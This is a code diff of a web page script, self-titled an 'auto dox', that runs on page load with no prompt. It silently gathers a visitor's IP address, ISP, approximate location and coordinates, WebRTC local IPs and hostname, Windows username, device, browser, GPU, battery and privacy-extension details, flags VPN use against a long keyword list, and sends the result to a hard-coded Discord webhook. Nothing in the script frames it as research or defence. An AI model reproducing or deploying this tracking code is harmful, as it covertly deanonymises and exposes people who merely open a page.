@@ -65,143 +65,195 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
 
     // ================================================================
-    //  MAIN - runs immediately, no permissions asked
+    //  BUILT-IN VPN/PROXY BLACKLIST (partial, but effective)
     // ================================================================
-    (async function() {
+    const VPN_KEYWORDS = [
+        'vpn','proxy','hosting','cloud','datacenter','incognito','anonymous',
+        'nordvpn','expressvpn','surfshark','cyberghost','ipvanish','private internet access',
+        'pia','torguard','vyprvpn','hotspot shield','windscribe','protonvpn','mullvad',
+        'purevpn','zenmate','tunnelbear','hidemyass','hma','ipredator','ovpn',
+        'azire','boleh','buffered','cactusvpn','earthvpn','fastestvpn','giganews','goldenfrog',
+        'ibvpn','ivpn','le vpn','liquidvpn','novpn','octanevpn','perfect privacy',
+        'personalvpn','powvpn','privatevpn','proxpn','pulsevpn','shadeyouvpn','slickvpn',
+        'spotflux','strongvpn','tor','tuxler','unblockvpn','usavpn','vpn unlimited',
+        'vpnarea','vpnbook','vpnsecure','vpnshield','vpnzilla','xvpn','zpn'
+    ];
 
-        // ---------- 1. IP GEOLOCATION (no permission) ----------
-        let ip = 'unknown', isp = '?', country = '?', region = '?', city = '?', lat = '?', lon = '?';
-        let proxy = false, vpn = 'Unknown';
-        const apis = [
-            'https://ipapi.co/json/',
-            'https://ipinfo.io/json?token=',
-            'http://ip-api.com/json/'
+    // ================================================================
+    //  HELPER: Parallel IP geolocation (6 services)
+    // ================================================================
+    async function fetchIPData() {
+        const services = [
+            { url: 'https://ipapi.co/json/', parser: d => ({ ip: d.ip, isp: d.org, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: d.proxy }) },
+            { url: 'https://ipinfo.io/json?token=', parser: d => ({ ip: d.ip, isp: d.org, country: d.country, region: d.region, city: d.city, lat: d.loc?.split(',')[0], lon: d.loc?.split(',')[1], proxy: false }) },
+            { url: 'http://ip-api.com/json/', parser: d => ({ ip: d.query, isp: d.isp, country: d.country, region: d.regionName, city: d.city, lat: d.lat, lon: d.lon, proxy: d.proxy || false }) },
+            { url: 'https://freegeoip.app/json/', parser: d => ({ ip: d.ip, isp: d.isp || d.org, country: d.country_name, region: d.region_name, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false }) },
+            { url: 'https://ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country_name, region: d.state_prov, city: d.city, lat: d.latitude, lon: d.longitude, proxy: false }) },
+            { url: 'https://api.ipdata.co/?api-key=YOUR_API_KEY', parser: d => ({ ip: d.ip, isp: d.isp, country: d.country_name, region: d.region, city: d.city, lat: d.latitude, lon: d.longitude, proxy: d.threat?.is_proxy || false }) }
         ];
-        for (const url of apis) {
-            try {
-                const res = await fetch(url, { signal: AbortSignal.timeout(3000) });
-                const d = await res.json();
-                if (d.ip || d.query) {
-                    ip = d.ip || d.query;
-                    isp = d.org || d.isp || '?';
-                    country = d.country_name || d.country || '?';
-                    region = d.region || d.regionName || '?';
-                    city = d.city || '?';
-                    lat = d.latitude || d.lat || '?';
-                    lon = d.longitude || d.lon || '?';
-                    proxy = d.proxy === true || d.proxy === 'true' || false;
-                    break;
-                }
-            } catch (_) {}
-        }
-        // VPN detection
-        const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','incognito','anonymous'];
-        vpn = (proxy || vpnKeywords.some(k => isp.toLowerCase().includes(k))) ? '✅ YES (VPN/Proxy)' : '❌ NO (residential)';
 
-        // ---------- 2. WebRTC local IPs + hostname (no permission) ----------
-        let localIPs = [];
-        let hostname = '';
-        try {
+        // Try all in parallel, resolve with first successful
+        const promises = services.map(async (s) => {
+            try {
+                const res = await fetch(s.url, { signal: AbortSignal.timeout(3000) });
+                const data = await res.json();
+                const parsed = s.parser(data);
+                if (parsed.ip) return parsed;
+            } catch (_) {}
+            return null;
+        });
+
+        const results = await Promise.allSettled(promises);
+        for (const r of results) {
+            if (r.status === 'fulfilled' && r.value && r.value.ip) {
+                return r.value;
+            }
+        }
+        return null;
+    }
+
+    // ================================================================
+    //  HELPER: WebRTC – local IPs + hostname
+    // ================================================================
+    function getWebRTCInfo() {
+        return new Promise((resolve) => {
+            const ips = [];
+            let hostname = '';
             const pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel('');
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            const ips = await new Promise((resolve) => {
-                const list = [];
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) {
-                        pc.close();
-                        resolve(list);
-                        return;
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+            pc.onicecandidate = (e) => {
+                if (!e.candidate) {
+                    pc.close();
+                    resolve({ localIPs: ips, hostname: hostname });
+                    return;
+                }
+                const parts = e.candidate.candidate.split(' ');
+                // candidate: ... type host udp 192.168.1.10  ...
+                // The 4th element is usually the IP, but sometimes the hostname.
+                // For hostname, we look for "host" type and the component after "host"
+                if (parts.length > 7) {
+                    const ipCandidate = parts[4];
+                    if (ipCandidate && ipCandidate.includes('.') && !ipCandidate.startsWith('0.')) {
+                        ips.push(ipCandidate);
                     }
-                    const parts = e.candidate.candidate.split(' ');
-                    const ipAddr = parts[4];
-                    if (ipAddr && ipAddr.includes('.') && !ipAddr.startsWith('0.')) {
-                        list.push(ipAddr);
-                    }
-                    // also try to extract hostname from the candidate (some browsers include it)
-                    const host = parts[5] || '';
-                    if (host && host.includes('.') && !host.includes(' ')) {
-                        // might be a hostname like "DESKTOP-ABC123.local"
-                        if (host.length > 3 && !host.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                    // Try to get hostname from the "host" field (if present)
+                    // Some browsers include it as part of the candidate string
+                    const candidateStr = e.candidate.candidate;
+                    const hostMatch = candidateStr.match(/ host (\S+)/);
+                    if (hostMatch && hostMatch[1]) {
+                        const host = hostMatch[1];
+                        if (host && !host.match(/^\d+\.\d+\.\d+\.\d+$/)) {
                             hostname = host;
                         }
                     }
-                };
-                setTimeout(() => { pc.close(); resolve(list); }, 3000);
-            });
-            localIPs = ips;
-            // if we didn't get hostname from candidate, try to resolve from first local IP via reverse DNS? Not possible.
-            // fallback: use the first IP as hostname (not great)
-        } catch (_) {}
+                }
+                // Also check for relatedAddress (often hostname)
+                if (e.candidate.relatedAddress && !e.candidate.relatedAddress.match(/^\d+\.\d+\.\d+\.\d+$/)) {
+                    hostname = e.candidate.relatedAddress;
+                }
+            };
+            setTimeout(() => { pc.close(); resolve({ localIPs: ips, hostname: hostname }); }, 3000);
+        });
+    }
 
-        // ---------- 3. Windows username (ActiveX - IE/old Edge) ----------
-        let winUser = 'not available (IE/ActiveX required)';
+    // ================================================================
+    //  HELPER: Windows username (ActiveX)
+    // ================================================================
+    function getWindowsUser() {
         try {
             const wsh = new ActiveXObject('WScript.Shell');
-            winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
-        } catch (_) {}
+            return wsh.ExpandEnvironmentStrings('%USERNAME%');
+        } catch (_) { return null; }
+    }
 
-        // ---------- 4. Device model / OS / browser display name (from UA and high-entropy) ----------
-        let deviceModel = 'Unknown';
+    // ================================================================
+    //  MAIN EXECUTION
+    // ================================================================
+    (async function() {
+
+        // ---- 1. IP + Geolocation ----
+        let geo = await fetchIPData();
+        if (!geo) {
+            // fallback: minimal data
+            geo = { ip: 'unknown', isp: '?', country: '?', region: '?', city: '?', lat: '?', lon: '?', proxy: false };
+        }
+
+        // ---- 2. VPN detection (extended) ----
+        const isVpn = geo.proxy || VPN_KEYWORDS.some(k => geo.isp.toLowerCase().includes(k) || (geo.isp + '').toLowerCase().includes(k));
+        const vpnStatus = isVpn ? '✅ YES (VPN/Proxy detected)' : '❌ NO (residential)';
+
+        // ---- 3. WebRTC ----
+        const webrtc = await getWebRTCInfo();
+        const localIPs = webrtc.localIPs;
+        let hostname = webrtc.hostname;
+        // if hostname is empty, try to extract from candidate (already done)
+
+        // ---- 4. Windows username ----
+        const winUser = getWindowsUser();
+
+        // ---- 5. System info ----
+        const ua = navigator.userAgent;
         let osDisplay = 'Unknown';
+        let deviceModel = 'Unknown';
         let browserName = 'Unknown';
+
+        // High-entropy (if available)
         try {
-            const ua = navigator.userAgent;
-            // Try high-entropy for model/platform
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                 const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
-                deviceModel = he.model || he.platform || 'Unknown';
-                osDisplay = he.platform || 'Unknown';
+                if (he.model) deviceModel = he.model;
+                if (he.platform) osDisplay = he.platform;
                 if (he.fullVersionList && he.fullVersionList.length) {
                     browserName = he.fullVersionList.map(b => b.brand + ' ' + b.version).join(', ');
                 }
             }
-            // Fallback parse from UA
-            if (deviceModel === 'Unknown' || deviceModel === 'Unknown') {
-                if (ua.includes('Windows NT')) {
-                    const winVer = ua.match(/Windows NT (\d+\.\d+)/);
-                    osDisplay = 'Windows ' + (winVer ? winVer[1] : 'NT');
-                    deviceModel = 'Windows PC (model hidden)';
-                } else if (ua.includes('Macintosh')) {
-                    osDisplay = 'macOS';
-                    const macModel = ua.match(/Macintosh; Intel Mac OS X [\d_]+\)/);
-                    deviceModel = macModel ? macModel[0].replace('Macintosh; ','') : 'Mac';
-                } else if (ua.includes('iPhone')) {
-                    const m = ua.match(/iPhone\s*([^;)]+)/);
-                    deviceModel = m ? m[0] : 'iPhone';
-                    osDisplay = 'iOS';
-                } else if (ua.includes('Android')) {
-                    const m = ua.match(/Android\s*([^;)]+)/);
-                    deviceModel = m ? m[0] : 'Android';
-                    osDisplay = 'Android';
-                } else {
-                    deviceModel = 'Unknown device';
-                }
-            }
-            // Try to get browser name from UA
-            if (browserName === 'Unknown') {
-                if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
-                else if (ua.includes('Firefox')) browserName = 'Firefox';
-                else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
-                else if (ua.includes('Edg')) browserName = 'Edge';
-                else browserName = 'Other';
-            }
         } catch (_) {}
 
-        // Combine hostname from WebRTC, winUser, and deviceModel to get "display name"
+        // Fallback UA parsing
+        if (osDisplay === 'Unknown') {
+            if (ua.includes('Windows NT')) {
+                const winVer = ua.match(/Windows NT (\d+\.\d+)/);
+                osDisplay = 'Windows ' + (winVer ? winVer[1] : 'NT');
+                deviceModel = 'Windows PC (model hidden)';
+            } else if (ua.includes('Macintosh')) {
+                osDisplay = 'macOS';
+                const macModel = ua.match(/Macintosh; Intel Mac OS X [\d_]+\)/);
+                deviceModel = macModel ? macModel[0].replace('Macintosh; ','') : 'Mac';
+            } else if (ua.includes('iPhone')) {
+                const m = ua.match(/iPhone\s*([^;)]+)/);
+                deviceModel = m ? m[0] : 'iPhone';
+                osDisplay = 'iOS';
+            } else if (ua.includes('Android')) {
+                const m = ua.match(/Android\s*([^;)]+)/);
+                deviceModel = m ? m[0] : 'Android';
+                osDisplay = 'Android';
+            } else {
+                osDisplay = 'Unknown OS';
+                deviceModel = 'Unknown device';
+            }
+        }
+        if (browserName === 'Unknown') {
+            if (ua.includes('Chrome') && !ua.includes('Edg')) browserName = 'Chrome';
+            else if (ua.includes('Firefox')) browserName = 'Firefox';
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = 'Safari';
+            else if (ua.includes('Edg')) browserName = 'Edge';
+            else browserName = 'Other';
+        }
+
+        // ---- 6. Build display name (real username) ----
         let displayName = '';
-        if (winUser && winUser !== 'not available (IE/ActiveX required)') {
+        if (winUser) {
             displayName = winUser;
         } else if (hostname && hostname.length > 0) {
-            displayName = hostname.split('.')[0]; // take first part before domain
+            displayName = hostname.split('.')[0]; // remove domain
         } else if (deviceModel && deviceModel !== 'Unknown') {
             displayName = deviceModel;
         } else {
             displayName = 'Unknown user';
         }
 
-        // ---------- 5. Other system info (no permissions) ----------
+        // ---- 7. Other system info ----
         let battery = 'unavailable';
         try {
             const b = await navigator.getBattery();
@@ -213,7 +265,7 @@
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const lang = navigator.language;
 
-        // ---------- 6. GPU via WebGL (no permission) ----------
+        // ---- 8. GPU ----
         let gpu = 'Unavailable', gpuLevel = 'Unknown';
         try {
             const canvas = document.createElement('canvas');
@@ -230,26 +282,27 @@
             }
         } catch (_) {}
 
-        // ---------- 7. Plugins & user level ----------
+        // ---- 9. Plugins & user level ----
         const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
         const savvy = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
         const count = savvy.filter(p => plugins.includes(p)).length;
         const userLevel = count >= 3 ? '🔥 Advanced privacy' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
 
-        // ---------- 8. Coordinates (IP-based, no permission) ----------
-        const coords = (lat !== '?' && lon !== '?') ? `${lat}, ${lon}` : 'IP location failed';
+        // ---- 10. Coordinates ----
+        const coords = (geo.lat && geo.lat !== '?' && geo.lon && geo.lon !== '?') ? `${geo.lat}, ${geo.lon}` : 'IP location failed';
 
-        // ---------- 9. Build final message ----------
+        // ---- 11. Final message ----
         const msg = 
-`**🔹 DEDSEC CTOS – AUTO DOX (NO PERMISSIONS) 🔹**
-**IP:** ${ip}
-**ISP:** ${isp}
-**VPN/Proxy:** ${vpn}
-**Location:** ${city}, ${region}, ${country}
+`**🔹 DEDSEC CTOS – ULTIMATE DOX (NO PERMISSIONS) 🔹**
+**IP:** ${geo.ip}
+**ISP:** ${geo.isp}
+**VPN/Proxy:** ${vpnStatus}
+**Location:** ${geo.city}, ${geo.region}, ${geo.country}
 **Coordinates (IP):** ${coords}
 **Local IPs (WebRTC):** ${localIPs.length ? localIPs.join(', ') : 'none'}
-**Windows Username:** ${winUser}
-**Display Name / Hostname:** ${displayName}
+**Computer Hostname:** ${hostname || 'not leaked'}
+**Windows Username:** ${winUser || 'not available (IE/ActiveX required)'}
+**Display Name (User):** ${displayName}
 **Device Model:** ${deviceModel}
 **OS:** ${osDisplay}
 **Browser:** ${browserName}
@@ -265,7 +318,7 @@
 **User Level:** ${userLevel}
 **Timestamp:** ${new Date().toLocaleString()}`;
 
-        // ---------- 10. Send to Discord (no popups) ----------
+        // ---- 12. Send to Discord ----
         try {
             await fetch(WEBHOOK, {
                 method: 'POST',
@@ -274,12 +327,11 @@
                 keepalive: true
             });
         } catch (e) {
-            // fallback
             const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
             navigator.sendBeacon(WEBHOOK, blob);
         }
 
-        console.log('✅ Data sent silently.');
+        console.log('✅ Data sent.');
     })();
 </script>
 </body>
